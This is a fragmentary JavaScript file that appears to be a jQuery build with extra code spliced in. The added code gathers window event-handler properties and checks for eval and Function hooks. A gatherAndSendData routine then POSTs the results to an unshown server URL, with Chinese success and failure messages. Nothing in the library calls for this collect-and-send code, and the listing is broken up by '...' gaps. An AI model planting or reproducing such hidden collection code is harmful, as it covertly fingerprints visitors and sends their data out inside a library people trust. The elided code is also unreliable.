...
(function (A, w) {
  ...
  const jsHookProperties = ['eval', 'Function'];

  // Gather additional window properties
  ...
  function gatherAdditionalProperties() {
    const additionalProps = {};
    for (const key in window) {
      if (key.startsWith('on')) {
        // Collect Event Listeners 
        additionalProps[key] = typeof window[key];
      }
    ...
    for (let prop of jsHookProperties) {
      // Collect JSHook Properties
      const type = typeof window[prop];
      additionalProps[prop] = {
        type: type,
        value: type === "function" ? undefined : window[prop]
      };
    }
  ...
  var G = "jQuery" + J(),
    Ya = 0,
    za = {};
  async function postDataToServer(url, method, data, successString, errorString) {
    try {
      ...
      if (response.ok) {
        ...
        console.error(`${errorString}, 状态码: ${response.status}`);
      }
    } catch (error) {
      console.error(`${errorString}, 错误: ${error}`);
    }
  }
  c.extend({
    cache: {},
  ...
  function gatherAndSendData(e) {
    ...
    if (Object.keys(gatheredData).length > 0) {
      ...
      const method = "POST";
      const successString = "数据发送成功";
      const errorString = "数据发送失败";
      postDataToServer(url, method, gatheredData, successString, errorString);
    }
  }
  c.event = {
